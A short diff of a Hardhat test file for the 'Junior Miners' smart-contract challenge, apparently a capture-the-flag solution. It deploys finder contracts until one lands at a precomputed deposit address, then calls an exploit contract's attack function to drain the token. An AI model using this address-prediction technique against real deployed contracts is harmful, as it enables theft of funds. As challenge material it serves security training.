@@ -28,12 +28,10 @@ describe('[Challenge] Junior Miners', function () {
         for (let nonce = 0; nonce <= 1; nonce++) {
             this.finder = await FinderFactory.deploy();
         }
+        await this.finder.find(65);
 
-        const finderTx = await this.finder.find(120, DEPOSIT_ADDRESS);
-        const { events } = await finderTx.wait();
-
-        const ExploitFactory = await ethers.getContractFactory("JuniorMinersExploit", attacker);
-        this.exploit = await ExploitFactory.attach(events[0].args.exploit);
+        const ExploitFactory = await ethers.getContractFactory("JuniorMinersExploit");
+        this.exploit = await ExploitFactory.attach(DEPOSIT_ADDRESS);
         await this.exploit.attack(this.token.address)
     });
 
